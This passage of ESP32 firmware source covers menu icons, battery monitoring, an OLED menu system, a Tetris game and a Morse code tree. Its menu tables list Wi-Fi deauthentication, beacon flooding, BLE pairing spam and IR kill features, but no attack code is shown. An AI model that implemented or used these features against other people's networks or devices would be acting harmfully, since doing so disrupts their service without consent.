// BT icon - Bluetooth symbol
static const unsigned char icon_bt_on[] PROGMEM = {
  0x00, 0x00, 0x80, 0x01, 0x88, 0x01, 0x50, 0x01, 0x20, 0x01, 0x50, 0x01,
  0x88, 0x01, 0x80, 0x01, 0x88, 0x01, 0x50, 0x01, 0x20, 0x01, 0x00, 0x00
};
// BT icon - off
static const unsigned char icon_bt_off[] PROGMEM = {
  0x00, 0x00, 0x80, 0x01, 0x88, 0x01, 0x50, 0x01, 0x20, 0x01, 0x50, 0x01,
  0x88, 0x01, 0x80, 0x01, 0x88, 0x01, 0x50, 0x01, 0x20, 0x01, 0x00, 0x00
};
// Lightning bolt icon (USB-C)
static const unsigned char icon_lightning[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0xE0, 0x00, 0xE0, 0x00, 0xE0, 0x00,
  0xE0, 0x00, 0xE0, 0x00, 0x60, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00
};
// Battery icon - 5 segments (will draw dynamically using bars)
// Menu icons (12x12)
static const unsigned char icon_wifi_menu[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0xE0, 0x01, 0x18, 0x06, 0x04, 0x08, 0x02, 0x10,
  0x02, 0x10, 0x00, 0x00, 0xC0, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const unsigned char icon_bt_menu[] PROGMEM = {
  0x00, 0x00, 0x80, 0x01, 0x88, 0x01, 0x50, 0x01, 0x20, 0x01, 0x50, 0x01,
  0x88, 0x01, 0x80, 0x01, 0x88, 0x01, 0x50, 0x01, 0x20, 0x01, 0x00, 0x00
};
static const unsigned char icon_attacks[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x60, 0x00, 0xE0, 0x01, 0xE0, 0x03,
  0xE0, 0x00, 0x60, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const unsigned char icon_blespam[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0C, 0x00, 0x1C, 0x00, 0x3C, 0x00,
  0x1C, 0x00, 0x0C, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const unsigned char icon_ir[] PROGMEM = {
  0x00, 0x00, 0x20, 0x00, 0x70, 0x00, 0xF8, 0x00, 0x70, 0x00, 0x20, 0x00,
  0x00, 0x00, 0x20, 0x00, 0x50, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const unsigned char icon_themes[] PROGMEM = {
  0x00, 0x00, 0x10, 0x00, 0x38, 0x00, 0x7C, 0x00, 0x38, 0x00, 0x10, 0x00,
  0x00, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0x00, 0x00
};
static const unsigned char icon_music[] PROGMEM = {
  0x00, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01,
  0x10, 0x01, 0x94, 0x01, 0xF6, 0x01, 0xE6, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const unsigned char icon_system[] PROGMEM = {
  0x00, 0x00, 0xF0, 0x00, 0xFE, 0x03, 0x0F, 0x06, 0x09, 0x04, 0x1F, 0x07,
  0x1F, 0x07, 0x09, 0x04, 0x0F, 0x06, 0xFE, 0x03, 0xF0, 0x00, 0x00, 0x00
};
static const unsigned char icon_about[] PROGMEM = {
  0x00, 0x00, 0xF0, 0x00, 0x0C, 0x03, 0x04, 0x02, 0xE4, 0x02, 0x04, 0x02,
  0x04, 0x02, 0xE4, 0x02, 0x04, 0x02, 0x0C, 0x03, 0xF0, 0x00, 0x00, 0x00
};
// Gamepad icon (for Games menu)
static const unsigned char icon_games[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0xFC, 0x01, 0x02, 0x02, 0x62, 0x0A, 0x22, 0x0A,
  0x22, 0x0A, 0xFE, 0x0F, 0x02, 0x02, 0xFC, 0x01, 0x00, 0x00, 0x00, 0x00
};
// Back arrow icon
static const unsigned char icon_back[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x60, 0x00, 0xFE, 0x01, 0xFE, 0x03,
  0xFE, 0x01, 0x60, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Morse code icon (12x12 XBM) - dot-dash pattern
static const unsigned char icon_morse[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0xE0, 0x01, 0x20, 0x01, 0x20, 0x01, 0xE0, 0x01,
  0x00, 0x00, 0xF0, 0x03, 0x10, 0x02, 0x10, 0x02, 0xF0, 0x03, 0x00, 0x00
};

// Array of menu icon pointers for quick lookup
const unsigned char* menuIcons[] = {
  icon_wifi_menu, icon_bt_menu, icon_music, icon_games,
  icon_about, icon_morse, icon_attacks, icon_system, icon_ir
};
static_assert(sizeof(menuIcons)/sizeof(menuIcons[0]) == 9, "Must have 9 menu icons");

// ===================== BATTERY MONITORING ===================
int batteryPercent = 100;       // Default 100%
float batteryVoltage = 0.0;     // Last read voltage
bool isUsbPowered = false;      // true if USB-C detected (battery charging)
unsigned long lastBatteryRead = 0;

float readBatteryVoltage() {
  // ESP32-S3 ADC1 on GPIO1 with voltage divider
  // Assumes 2x 100k resistors divider on battery (max 4.2V -> 2.1V at ADC)
  // ADC resolution 12-bit, reference voltage ~3.3V internally
  // Return voltage in volts
  #ifdef BATTERY_ADC_PIN
  pinMode(BATTERY_ADC_PIN, INPUT);
  analogReadResolution(12);
  int raw = analogRead(BATTERY_ADC_PIN);
  // ADC reading 0-4095 maps to 0-3.3V. With divider: V_bat = ADC_V * 2
  float adcVoltage = (raw / 4095.0f) * 3.3f;
  float batVoltage = adcVoltage * 2.0f;
  // Detect USB-C: if voltage > 4.5V, we're on USB-C power
  isUsbPowered = (batVoltage > 4.5f);
  return batVoltage;
  #else
  return 0.0f;
  #endif
}

int voltageToPercent(float volts) {
  // LiPo: 3.0V = 0%, 4.2V = 100% (linear approximation)
  if (volts >= 4.2f) return 100;
  if (volts <= 3.0f) return 0;
  return (int)((volts - 3.0f) / 1.2f * 100.0f);
}

void updateBatteryReading() {
  unsigned long now = millis();
  if (now - lastBatteryRead < BATTERY_READ_INTERVAL) return;
  lastBatteryRead = now;
  batteryVoltage = readBatteryVoltage();
  batteryPercent = voltageToPercent(batteryVoltage);
  // If battery voltage is 0 (no ADC pin), keep 100% default
  if (batteryVoltage < 0.1f) batteryPercent = 100;
}

// ===================== FORWARD DECLARATIONS ====================
void startBleAdvertising();
void stopBleAdvertising();
extern int tvbgoneIndex;
void marioStartGame();
void marioHandleInput();
void oledRenderMario();
void oledRenderMarioGameOver();
void oledRenderMarioWin();
void runMarioLoop();
void marioExitGame();

// ===================== OLED STATE MACHINE ====================
U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R2, U8X8_PIN_NONE, OLED_SDA, OLED_SCL);

enum MenuScreen : uint8_t {
  MENU_MAIN,
  MENU_WIFI, MENU_WIFI_STATUS, MENU_WIFI_SCAN,
  MENU_BT, MENU_BT_SCAN, MENU_BT_PAIRED,
  MENU_ATTACKS,
  MENU_DEAUTH, MENU_BEACON, MENU_HOP, MENU_PROBE,
  MENU_BLESPAM,
  MENU_IR, MENU_IR_SEND, MENU_GREE, MENU_TVBGONE, MENU_COOLBEGONE, MENU_IR_KILL,
  MENU_REMOTES, MENU_REMOTE_BUTTONS,
  MENU_SIGNALS, MENU_PROJECTORS,
  MENU_THEMES,
  MENU_MUSIC,
  MENU_SYSTEM, MENU_STATS, MENU_LOG,
  MENU_CONFIRM, MENU_ABOUT,
  MENU_GAMES, MENU_TETRIS,
  MENU_MARIO, MENU_MARIO_GAMEOVER, MENU_MARIO_WIN,
  MENU_MORSE_NOTEBOOK,
  MENU_FREQ_TESTER
};

struct OLEDState {
  MenuScreen screen;
  int8_t cursor;
  int8_t scrollOffset;
  int8_t greeField;       // 0=brand 1=power 2=temp 3=mode 4=fan 5=send 6=back
  int8_t confirmAction;   // 0=reboot 1=reset 2=exit
  int8_t remoteIdx;       // selected remote index
  int8_t remoteBtnOffset; // scroll for remote buttons
  int8_t signalOffset;    // scroll for signals
  int8_t logScroll;       // scroll for log
  int8_t mainMenuPage;    // 0 or 1 for main menu pagination
  // Gree AC persistent state
  bool greePower;
  int8_t greeTemp;
  int8_t greeMode;        // 0=Cool 1=Dry 2=Fan 3=Auto
  int8_t greeFan;         // 0=Auto 1=Low 2=Med 3=High
  int8_t acBrand;         // 0=GREE 1=COOLIX 2=HAIER 3=HAIER160 4=KELVINATOR 5=UNIVERSAL
  int8_t projBrand;       // 0=BenQ 1=Epson 2=Optoma 3=ViewSonic
  int8_t projField;       // 0=brand 1=powerON 2=powerOFF 3=back
};

OLEDState oledState = {MENU_MAIN, 0, 0, 0, 0, 0, 0, 0, 0, 0, true, 24, 0, 0, 0, 0, 0};
bool oledInitialized = false;
bool oledNeedsRedraw = true;
unsigned long oledLastActivity = 0;
bool oledDimmed = false;
bool oledOff = false;
unsigned long oledLastDraw = 0;
const unsigned long OLED_FRAME_MS = 50; // 20 fps max

// ===================== MAIN MENU ITEMS ======================
const char* mainMenuItems[] = {
  "WiFi", "Bluetooth", "Music", "Games",
  "About", "Morse", "WiFi Attacks", "System", "IR Control"
};
const int mainMenuItemCount = 9;

// Main menu card items (2 pages)
const char* mainMenuCardLabels[2][6] = {
  {"WiFi", "BT", "Music", "Games", "About", "Morse"},
  {"Attacks", "System", "Themes", "BLE Spam", "IR", "Buzzer"}
};
const unsigned char* mainMenuCardIcons[2][6] = {
  {icon_wifi_menu, icon_bt_menu, icon_music, icon_games, icon_about, icon_morse},
  {icon_attacks, icon_system, icon_themes, icon_blespam, icon_ir, icon_back}
};
const int mainMenuCardCounts[2] = {6, 6};

const char* wifiMenuItems[] = {"Radio", "Status", "Saved Net", "Scan", "AP Config", "Back"};
const int wifiMenuItemCount = 6;

const char* btMenuItems[] = {"Radio", "Name", "Scan", "Paired", "Back"};
const int btMenuItemCount = 5;

const char* attacksMenuItems[] = {"Deauth", "Beacon", "Channel Hop", "Probe Sniff", "Back"};
const int attacksMenuItemCount = 5;

const char* bleSpamItems[] = {
  "AirTag", "SmartTag", "Swift Pair", "Fast Pair",
  "iBeacon", "Eddystone", "Pair Flood", "Name Rand",
  "STOP ALL", "Back"
};
const int bleSpamItemCount = 10;

const char* irMenuItems[] = {"Scanner", "Send IR", "ACs", "IR Kill", "Remotes", "Signals", "Projectors", "Back"};
const int irMenuItemCount = 8;

const char* themeNames[] = {
  "Matrix", "Cyberpunk", "Hacker", "Deep Blue",
  "Synthwave", "Blood Dragon", "Night Vision", "Ghost"
};

const char* systemMenuItems[] = {"Stats", "Log", "Reboot", "Factory Reset", "Back"};
const int systemMenuItemCount = 5;

const char* gamesMenuItems[] = {"Tetris", "Super Mario", "Back"};
const int gamesMenuItemCount = 3;

// ===================== TETRIS CONSTANTS AND STATE =====================
#define TETRIS_COLS 10
#define TETRIS_ROWS 20
#define TETRIS_BLOCK 6   // pixel size of each cell
#define TETRIS_BOARD_X 2 // board X offset in R3 mode (60px wide centered in 64)
#define TETRIS_BOARD_Y 4 // board Y offset in R3 mode (120px tall centered in 128)
#define TETRIS_HOLD_MS 2000 // 2-second hold to pause
#define TETRIS_HOLD_EXIT_MS 5000 // 5-second hold to exit to menu from pause
#define TETRIS_DAS_DELAY_MS 200  // initial delay before direction auto-repeat
#define TETRIS_DAS_REPEAT_MS 80  // repeat interval for direction auto-repeat

// Tetromino patterns: 7 pieces × 4 rotations, each as 4x4 bitmask (16 bits)
// Stored in PROGMEM as uint16_t[7][4]
static const uint16_t tetrisShapes[7][4] PROGMEM = {
  // I-piece
  {0x0F00, 0x4444, 0x00F0, 0x2222},
  // O-piece
  {0x6600, 0x6600, 0x6600, 0x6600},
  // T-piece
  {0x4E00, 0x4640, 0x0E40, 0x4C40},
  // S-piece
  {0x6C00, 0x4620, 0x06C0, 0x8C40},
  // Z-piece
  {0xC600, 0x2640, 0x0C60, 0x4C80},
  // J-piece
  {0x4400, 0x44C0, 0x0E80, 0xC440},
  // L-piece
  {0x8E00, 0x6440, 0x0E20, 0x44C0}
};

// Score thresholds for each piece type (0 = no score, actual scoring uses lines cleared)
const int tetrisScoreTable[4] = {100, 300, 500, 800};

// Tetris game state
struct TetrisGame {
  uint8_t board[TETRIS_ROWS][TETRIS_COLS]; // 0=empty, 1-7=piece type
  int8_t pieceType;     // 0-6
  int8_t pieceRot;      // 0-3
  int8_t pieceX;        // X position (col, 0=left)
  int8_t pieceY;        // Y position (row, 0=top)
  uint8_t nextPiece;    // next piece type
  int score;
  int level;
  int lines;
  bool gameOver;
  bool paused;
  bool started;
  unsigned long lastDrop;
  int dropInterval;
  unsigned long lockDelayStart;
  bool lockDelayActive;
  int lockDelayMax;     // ms before piece locks
  unsigned long centerHoldStart; // when center was first pressed
  bool centerHeld;
  // DAS (Delayed Auto Shift) for directional buttons
  unsigned long dasHoldStart[4]; // 0=left, 1=right, 2=up, 3=down
  unsigned long dasLastRepeat[4];
  bool dasInitialAct[4]; // false = still in initial delay, true = repeating
  // 7-bag randomizer
  uint8_t bag[7];
  int bagIndex;
  // Orientation tracking
  const u8g2_cb_t *prevRotation;
};

TetrisGame tetris = {0};

// ===================== MORSE NOTEBOOK STATE =====================
String notebookText = "";
int16_t notebookCursorPos = 0;
uint8_t morseTreeIdx = 0;
String activeTapVisual = "";
unsigned long lastBlinkTime = 0;
bool cursorVisible = true;
unsigned long morseRightHoldStart = 0;
bool morseRightHeld = false;
unsigned long morseLeftWipeStart = 0;
bool morseLeftWiping = false;
#define MORSE_BACKSPACE_INTERVAL 150
#define MORSE_WIPE_HOLD_MS 1500

// Flat binary tree for Morse code lookup (0-based indexing)
// Root: index 0 = '*'; left child = 2*i+1, right child = 2*i+2
// '*' = unused node; traversal from root, left='.' (dot), right='-' (dash)
const char morseTree[] = {
    '*', 'E', 'T', 'I', 'A', 'N', 'M', 'S', 'U', 'R', 'W', 'D', 'K', 'G', 'O',
    'H', 'V', 'F', '*', 'L', '*', 'P', 'J', 'B', 'X', 'C', 'Y', 'Z', 'Q', '*', '*',
    '5', '4', '*', '3', '*', '*', '*', '2', '*', '*', '*', '*', '*', '*', '*', '1',
    '6', '-', '/', '*', '*', '*', '*', '*', '7', '*', '*', '*', '8', '*', '9', '0'
};

// ===================== TETRIS BAG RANDOMIZER =====================
static void tetrisFillBag() {
  for (int i = 0; i < 7; i++) tetris.bag[i] = i;
  // Fisher-Yates shuffle
  for (int i = 6; i > 0; i--) {
    int j = random(0, i + 1);
    uint8_t tmp = tetris.bag[i];
    tetris.bag[i] = tetris.bag[j];
    tetris.bag[j] = tmp;
  }
  tetris.bagIndex = 0;
}

static uint8_t tetrisNextBag() {
  if (tetris.bagIndex >= 7) tetrisFillBag();
  return tetris.bag[tetris.bagIndex++];
}

// ===================== TETRIS PIECE HELPERS =====================
// Get the shape bitmask for piece type and rotation
static uint16_t tetrisGetShape(int type, int rot) {
  return pgm_read_word(&tetrisShapes[type][rot]);
}

// Get the bounding box width of a piece shape (number of columns from 4x4)
static int tetrisPieceWidth(uint16_t shape) {
  int minCol = 4, maxCol = 0;
  for (int row = 0; row < 4; row++) {
    for (int col = 0; col < 4; col++) {
      if (shape & (1 << (15 - (row * 4 + col)))) {
        if (col < minCol) minCol = col;
        if (col > maxCol) maxCol = col;
      }
    }
  }
  return maxCol - minCol + 1;
}

// Check if piece at (px, py) with given shape collides with board or walls
static bool tetrisCollides(int px, int py, uint16_t shape) {
  for (int row = 0; row < 4; row++) {
    for (int col = 0; col < 4; col++) {
      if (shape & (1 << (15 - (row * 4 + col)))) {
        int bx = px + col;
        int by = py + row;
        if (bx < 0 || bx >= TETRIS_COLS || by >= TETRIS_ROWS) return true;
        if (by >= 0 && tetris.board[by][bx] != 0) return true;
      }
    }
  }
  return false;
}

// Spawn a new piece
static void tetrisSpawnPiece() {
  tetris.pieceType = tetris.nextPiece;
  tetris.nextPiece = tetrisNextBag();
  tetris.pieceRot = 0;
  tetris.pieceX = (TETRIS_COLS - tetrisPieceWidth(tetrisGetShape(tetris.pieceType, 0))) / 2;
  tetris.pieceY = 0;
  tetris.lockDelayActive = false;
  
  // Check if new piece collides -> game over
  if (tetrisCollides(tetris.pieceX, tetris.pieceY, tetrisGetShape(tetris.pieceType, 0))) {
    tetris.gameOver = true;
  }
}

// Lock piece into board
static void tetrisLockPiece() {
  uint16_t shape = tetrisGetShape(tetris.pieceType, tetris.pieceRot);
  for (int row = 0; row < 4; row++) {
    for (int col = 0; col < 4; col++) {
      if (shape & (1 << (15 - (row * 4 + col)))) {
        int bx = tetris.pieceX + col;
        int by = tetris.pieceY + row;
        if (by >= 0 && by < TETRIS_ROWS && bx >= 0 && bx < TETRIS_COLS) {
          tetris.board[by][bx] = tetris.pieceType + 1; // 1-7
        }
      }
    }
  }
  
  // Check for line clears
  int cleared = 0;
  for (int row = TETRIS_ROWS - 1; row >= 0; row--) {
    bool full = true;
    for (int col = 0; col < TETRIS_COLS; col++) {
      if (tetris.board[row][col] == 0) { full = false; break; }
    }
    if (full) {
      // Shift everything down
      for (int r = row; r > 0; r--) {
        memcpy(tetris.board[r], tetris.board[r-1], TETRIS_COLS);
      }
      memset(tetris.board[0], 0, TETRIS_COLS);
      cleared++;
      row++; // recheck same row
    }
  }
  
  if (cleared > 0) {
    int idx = (cleared > 4) ? 3 : (cleared - 1);
    tetris.score += tetrisScoreTable[idx] * tetris.level;
    tetris.lines += cleared;
    tetris.level = tetris.lines / 10 + 1;
    tetris.dropInterval = max(100, 500 - (tetris.level - 1) * 40);
  }
  
  tetrisSpawnPiece();
}

// ===================== TETRIS GAME CONTROL =====================
static void tetrisStartGame() {
  memset(tetris.board, 0, sizeof(tetris.board));
  tetris.score = 0;
  tetris.level = 1;
  tetris.lines = 0;
  tetris.gameOver = false;
  tetris.paused = false;
  tetris.started = true;
  tetris.dropInterval = 500;
  tetris.lastDrop = 0;
  tetris.lockDelayActive = false;
  tetris.centerHeld = false;
  tetris.centerHoldStart = 0;
  for (int i = 0; i < 4; i++) {
    tetris.dasHoldStart[i] = 0;
    tetris.dasLastRepeat[i] = 0;
    tetris.dasInitialAct[i] = false;
  }
  tetris.prevRotation = &u8g2_cb_r2; // normal orientation
  
  tetrisFillBag();
  tetris.nextPiece = tetrisNextBag();
  tetrisSpawnPiece();
  
  // Switch display to R3
  u8g2.setDisplayRotation(U8G2_R3);
  oledNeedsRedraw = true;
}

static void tetrisExitGame() {
  // Restore rotation
  u8g2.setDisplayRotation(tetris.prevRotation);
  tetris.started = false;
  oledState.screen = MENU_GAMES;
  oledState.cursor = 0;
  oledNeedsRedraw = true;
}

static void tetrisRestartGame() {
  tetrisStartGame();
}

// ===================== TETRIS PIECE MOVEMENT =====================
static bool tetrisMovePiece(int dx, int dy) {
  uint16_t shape = tetrisGetShape(tetris.pieceType, tetris.pieceRot);
  if (!tetrisCollides(tetris.pieceX + dx, tetris.pieceY + dy, shape)) {
    tetris.pieceX += dx;
    tetris.pieceY += dy;
    tetris.lockDelayActive = false; // reset lock delay on movement
    return true;
  }
  return false;
}

static bool tetrisRotatePiece() {
  int newRot = (tetris.pieceRot + 1) % 4;
  uint16_t newShape = tetrisGetShape(tetris.pieceType, newRot);
  // Basic wall kick: try original position, then left, right, up
  int kicksX[] = {0, -1, 1, 0, -2, 2};
  int kicksY[] = {0, 0, 0, -1, 0, 0};
  for (int i = 0; i < 6; i++) {
    if (!tetrisCollides(tetris.pieceX + kicksX[i], tetris.pieceY + kicksY[i], newShape)) {
      tetris.pieceX += kicksX[i];
      tetris.pieceY += kicksY[i];
      tetris.pieceRot = newRot;
      tetris.lockDelayActive = false;
      return true;
    }
  }
  return false;
}

static void tetrisHardDrop() {
  uint16_t shape = tetrisGetShape(tetris.pieceType, tetris.pieceRot);
  int dropDist = 0;
  while (!tetrisCollides(tetris.pieceX, tetris.pieceY + dropDist + 1, shape)) {
    dropDist++;
  }
  tetris.pieceY += dropDist;
  tetris.score += dropDist * 2; // bonus points for hard drop
  tetrisLockPiece();
}

// ===================== TETRIS OLED RENDERER (R3 mode) =====================
// In R3 mode: display 128px tall, 64px wide
// Playfield: board Y-axis maps to OLED X, board X-axis maps to OLED Y

void oledRenderTetris() {
  u8g2.clearBuffer();
  
  // Draw playfield border
  u8g2.drawFrame(TETRIS_BOARD_X-1, TETRIS_BOARD_Y-1, 
                 TETRIS_COLS * TETRIS_BLOCK + 2, TETRIS_ROWS * TETRIS_BLOCK + 2);
  
  // Draw locked blocks
  for (int row = 0; row < TETRIS_ROWS; row++) {
    for (int col = 0; col < TETRIS_COLS; col++) {
      if (tetris.board[row][col] != 0) {
        int x = TETRIS_BOARD_X + col * TETRIS_BLOCK;
        int y = TETRIS_BOARD_Y + row * TETRIS_BLOCK;
        // Draw filled block with pattern based on piece type (1-7)
        uint8_t pt = tetris.board[row][col] - 1;
        u8g2.drawFrame(x, y, TETRIS_BLOCK, TETRIS_BLOCK);
        u8g2.drawBox(x+1, y+1, TETRIS_BLOCK-2, TETRIS_BLOCK-2);
        // Add distinguishing pattern
        if (pt == 0) { // I - horizontal lines
          u8g2.drawHLine(x, y+TETRIS_BLOCK/2, TETRIS_BLOCK);
        } else if (pt == 1) { // O - vertical lines
          u8g2.drawVLine(x+TETRIS_BLOCK/2, y, TETRIS_BLOCK);
        } else if (pt == 2) { // T - diagonal \
          u8g2.drawLine(x, y, x+TETRIS_BLOCK-1, y+TETRIS_BLOCK-1);
        } else if (pt == 3) { // S - diagonal /
          u8g2.drawLine(x+TETRIS_BLOCK-1, y, x, y+TETRIS_BLOCK-1);
        } else if (pt == 4) { // Z - cross hatch
          u8g2.drawLine(x, y, x+TETRIS_BLOCK-1, y+TETRIS_BLOCK-1);
          u8g2.drawLine(x+TETRIS_BLOCK-1, y, x, y+TETRIS_BLOCK-1);
        } else if (pt == 5) { // J - dot center
          u8g2.drawPixel(x+TETRIS_BLOCK/2, y+TETRIS_BLOCK/2);
        } else { // L - empty center
          // already drawn as box, just add frame
        }
      }
    }
  }
  
  // Draw active piece
  if (!tetris.gameOver && !tetris.paused) {
    uint16_t shape = tetrisGetShape(tetris.pieceType, tetris.pieceRot);
    for (int row = 0; row < 4; row++) {
      for (int col = 0; col < 4; col++) {
        if (shape & (1 << (15 - (row * 4 + col)))) {
          int bx = tetris.pieceX + col;
          int by = tetris.pieceY + row;
          if (by >= 0 && by < TETRIS_ROWS && bx >= 0 && bx < TETRIS_COLS) {
            int x = TETRIS_BOARD_X + bx * TETRIS_BLOCK;
            int y = TETRIS_BOARD_Y + by * TETRIS_BLOCK;
            u8g2.drawFrame(x, y, TETRIS_BLOCK, TETRIS_BLOCK);
            u8g2.drawBox(x+1, y+1, TETRIS_BLOCK-2, TETRIS_BLOCK-2);
          }
        }
      }
    }
  }
  
  // Side panel (to the right of the board in R3, which is "bottom" in normal orientation)
  int sideX = TETRIS_BOARD_X + TETRIS_COLS * TETRIS_BLOCK + 6;
  int sideY = TETRIS_BOARD_Y;
  
  u8g2.setFont(u8g2_font_4x6_tf);
  
  // Score
  u8g2.drawStr(sideX, sideY, "SCORE");
  sideY += 7;
  char buf[16];
  snprintf(buf, sizeof(buf), "%d", tetris.score);
  u8g2.drawStr(sideX, sideY, buf);
  sideY += 8;
  
  // Level
  u8g2.drawStr(sideX, sideY, "LEVEL");
  sideY += 7;
  snprintf(buf, sizeof(buf), "%d", tetris.level);
  u8g2.drawStr(sideX, sideY, buf);
  sideY += 8;
  
  // Lines
  u8g2.drawStr(sideX, sideY, "LINES");
  sideY += 7;
  snprintf(buf, sizeof(buf), "%d", tetris.lines);
  u8g2.drawStr(sideX, sideY, buf);
  sideY += 10;
  
  // Next piece preview
  u8g2.drawStr(sideX, sideY, "NEXT");
  sideY += 7;
  uint16_t nextShape = tetrisGetShape(tetris.nextPiece, 0);
  for (int row = 0; row < 4; row++) {
    for (int col = 0; col < 4; col++) {
      if (nextShape & (1 << (15 - (row * 4 + col)))) {
        int px = sideX + col * 5;
        int py = sideY + row * 5;
        u8g2.drawFrame(px, py, 5, 5);
        u8g2.drawBox(px+1, py+1, 3, 3);
      }
    }
  }
  
  // Game over overlay
  if (tetris.gameOver) {
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawStr(4, 60, "GAME OVER");
    u8g2.setFont(u8g2_font_4x6_tf);
    snprintf(buf, sizeof(buf), "Score:%d", tetris.score);
    u8g2.drawStr(4, 68, buf);
    u8g2.drawStr(4, 76, "CENTER=Menu");
  }
  
  // Paused overlay
  if (tetris.paused && !tetris.gameOver) {
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawStr(4, 60, "PAUSED");
    u8g2.setFont(u8g2_font_4x6_tf);
    u8g2.drawStr(4, 68, "CENTER=Resume");
    u8g2.drawStr(4, 76, "HOLD 5s=Menu");
  }
  
  u8g2.sendBuffer();
}

// ===================== TETRIS INPUT HANDLER =====================
// Helper to do a single directional action and track DAS state
static void tetrisDoAction(int btnIdx, int dx, int dy, bool hardDrop) {
  unsigned long now = millis();
  if (hardDrop) {
    tetrisHardDrop();
    tetris.dasInitialAct[btnIdx] = false;
    tetris.dasHoldStart[btnIdx] = 0;
  } else {
    if (tetrisMovePiece(dx, dy)) {
      // Soft drop bonus only for down moves
      if (dx == 0 && dy == 1) tetris.score += 1;
    }
    // Reset DAS flags on this button - initial act done
    tetris.dasInitialAct[btnIdx] = true;
    tetris.dasHoldStart[btnIdx] = now;
    tetris.dasLastRepeat[btnIdx] = now;
  }
  oledNeedsRedraw = true;
}

// Process DAS auto-repeat for a held directional button
static void tetrisProcessDAS(int btnIdx, int dx, int dy, bool held) {
  unsigned long now = millis();
  if (!held) {
    tetris.dasInitialAct[btnIdx] = false;
    tetris.dasHoldStart[btnIdx] = 0;
    return;
  }
  if (!tetris.dasInitialAct[btnIdx]) {
    // Button just started being held, will be handled by pressed event
    return;
  }
  if (tetris.dasHoldStart[btnIdx] == 0) return;
  
  unsigned long elapsed = now - tetris.dasHoldStart[btnIdx];
  if (elapsed >= TETRIS_DAS_DELAY_MS) {
    // Initial delay passed, enter repeat mode
    if (now - tetris.dasLastRepeat[btnIdx] >= TETRIS_DAS_REPEAT_MS) {
      tetris.dasLastRepeat[btnIdx] = now;
      if (tetrisMovePiece(dx, dy)) {
        if (dx == 0 && dy == 1) tetris.score += 1;
      }
      oledNeedsRedraw = true;
    }
  }
}

// Track left button hold for exit during pause
static unsigned long leftExitHoldStart = 0;
static bool leftExitTracking = false;

// Track DAS state for directional buttons
static unsigned long dasHoldStart[4] = {0, 0, 0, 0};
static unsigned long dasLastRepeat[4] = {0, 0, 0, 0};
static bool dasActive[4] = {false, false, false, false};

// Helper: do DAS auto-repeat for a held button
static void tetrisDasRepeat(int idx, int dx, int dy, bool currentlyHeld, bool justPressed) {
  unsigned long now = millis();
  
  if (justPressed) {
    dasHoldStart[idx] = now;
    dasLastRepeat[idx] = now;
    dasActive[idx] = true;
  } else if (!currentlyHeld) {
    dasActive[idx] = false;
    return;
  }
  
  if (!dasActive[idx]) return;
  
  unsigned long elapsed = now - dasHoldStart[idx];
  if (elapsed >= TETRIS_DAS_DELAY_MS) {
    if (now - dasLastRepeat[idx] >= TETRIS_DAS_REPEAT_MS) {
      tetrisMovePiece(dx, dy);
      if (dy == 1) tetris.score += 1; // soft drop bonus
      dasLastRepeat[idx] = now;
      oledNeedsRedraw = true;
    }
  }
}

void tetrisHandleInput() {
  unsigned long now = millis();
  
  // On game over, short center press immediately exits to menu
  if (btnCenterPressed && tetris.gameOver) {
    tetrisExitGame();
    return;
  }
  if (tetris.gameOver) return;
  
  bool centerStillHeld = (digitalRead(BTN_CENTER) == LOW);
  
  // ---- CENTER BUTTON: hold-to-pause/exit detection ----
  if (btnCenterPressed) {
    tetris.centerHoldStart = now;
    tetris.centerHeld = true;
  }
  
  if (tetris.centerHeld) {
    if (centerStillHeld) {
      // Button still held down - check hold duration thresholds
      unsigned long holdMs = now - tetris.centerHoldStart;
      if (tetris.paused) {
        // When paused: hold 5s to exit to menu
        if (holdMs >= TETRIS_HOLD_EXIT_MS) {
          tetris.centerHeld = false;
          tetrisExitGame();
          return;
        }
      } else {
        // When playing: hold 2s to pause
        if (holdMs >= TETRIS_HOLD_MS) {
          tetris.centerHeld = false;
          tetris.paused = true;
          oledNeedsRedraw = true;
          return;
        }
      }
    } else {
      // Button was released before hold threshold = short press
      tetris.centerHeld = false;
      if (tetris.paused) {
        // Short tap while paused = resume game
        tetris.paused = false;
        oledNeedsRedraw = true;
        return;
      }
      // Short tap while playing = rotate (handled below by btnCenterPressed)
    }
  }
  
  if (tetris.paused) return;
  
  // Short CENTER press = rotate (fires on the press frame)
  if (btnCenterPressed) {
    tetrisRotatePiece();
    oledNeedsRedraw = true;
    return;
  }
  
  // ---- LEFT BUTTON HOLD-TO-EXIT when paused ----
  if (tetris.paused) {
    // Track left button hold for 5-second exit
    if (btnLeftPressed) {
      leftExitHoldStart = now;
      leftExitTracking = true;
    }
    if (leftExitTracking) {
      if (btnLeftState == LOW) {
        // Left button still held
        if (now - leftExitHoldStart >= TETRIS_HOLD_EXIT_MS) {
          leftExitTracking = false;
          tetrisExitGame();
          return;
        }
      } else {
        leftExitTracking = false;
      }
    }
    return;
  }
  
  // ---- DIRECTIONAL MOVEMENT WITH DAS ----
  // Remapped navigation: Left=soft drop, Right=hard drop, Down=right, Up=left
  
  // Handle new press events for each direction
  if (btnLeftPressed) {
    tetrisMovePiece(0, 1); // soft drop
    tetris.score += 1;
    dasHoldStart[0] = now;
